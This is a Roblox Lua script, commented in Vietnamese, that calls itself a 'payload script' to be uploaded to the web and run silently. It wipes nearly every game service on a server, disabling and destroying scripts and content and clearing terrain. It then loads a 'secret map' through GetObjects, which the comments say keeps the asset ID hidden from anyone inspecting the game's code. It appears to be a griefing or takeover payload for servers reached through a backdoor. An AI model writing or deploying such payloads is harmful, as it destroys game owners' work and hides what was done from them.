--[[ 
    PAYLOAD SCRIPT (Up cái này lên web)
    Script này sẽ chạy ngầm, dọn sạch server và tải map về.
]]

local SecretMapID = 85701741679815 -- <<< THAY ID MODEL MAP CỦA BẠN VÀO ĐÂY

-- // PHẦN 1: CẤU HÌNH DỌN DẸP (Code của bạn đã tối ưu) //
local lighting = game:GetService("Lighting")
local starterPlayer = game:GetService("StarterPlayer")
local players = game:GetService("Players")

local servicesToClear = {
    game:GetService("Workspace"),
    game:GetService("Lighting"),
    game:GetService("ReplicatedFirst"),
    game:GetService("ReplicatedStorage"),
    game:GetService("ServerScriptService"),
    game:GetService("ServerStorage"),
    game:GetService("StarterGui"),
    game:GetService("StarterPack"),
    game:GetService("Teams"),
    game:GetService("SoundService"),
    starterPlayer.StarterPlayerScripts,
    starterPlayer.StarterCharacterScripts
}

local function CleanServer()
    -- Cài đặt Lighting
    lighting.Ambient = Color3.fromRGB(70,70,70)
    lighting.Brightness = 3
    lighting.GlobalShadows = true
    lighting.ClockTime = 14.5
    
    -- Cài đặt Player
    starterPlayer.CharacterWalkSpeed = 16
    if not starterPlayer.CharacterUseJumpPower then
        starterPlayer.CharacterJumpHeight = 7.2
    else
        starterPlayer.CharacterUseJumpPower = true
        starterPlayer.CharacterJumpPower = 50
    end
    players.RespawnTime = 3

    -- Dọn dẹp
    for _, service in pairs(servicesToClear) do
        if service.Name == "Workspace" then
            workspace.Terrain:Clear()
            for _,v in pairs(service:GetChildren()) do
                if not v:IsA("Terrain") and not v:IsA("Camera") then
                    pcall(function() v:Destroy() end)
                end
            end
        else
            for _,v in pairs(service:GetChildren()) do
                if v.Name ~= "PlayerRemove" and not v:IsA("Player") then
                    if v:IsA("Script") then v.Enabled = false end
                    pcall(function() v:Destroy() end)
                end
            end
        end
    end
    print("🧹 Đã dọn sạch Server!")
end

-- // PHẦN 2: TẢI MAP BÍ MẬT //
local function GhostLoadMap()
    print("📦 Đang tải map ẩn...")
    
    -- Sử dụng GetObjects: Cách này tải Model mà không cần require Module
    -- Roblox vẫn biết asset được tải, nhưng người soi code trong game sẽ không thấy ID
    local success, assets = pcall(function()
        return game:GetObjects("rbxassetid://" .. SecretMapID)
    end)

    if success and assets then
        for _, object in pairs(assets) do
            -- Tự động phân loại: Nếu folder tên Workspace thì ném vào Workspace, v.v.
            local targetService = game:GetService(object.Name)
            if targetService then
                for _, child in pairs(object:GetChildren()) do
                    child.Parent = targetService
                end
            else
                -- Nếu không có tên Service cụ thể, mặc định ném vào Workspace
                object.Parent = workspace
            end
        end
        print("✅ Map đã được tải thành công!")
    else
        warn("⚠️ Lỗi tải Map: Không tìm thấy ID hoặc Model chưa public.")
    end
end

-- // CHẠY QUY TRÌNH //
CleanServer()
task.wait(0.5) -- Nghỉ một chút để server xử lý việc xóa
GhostLoadMap()
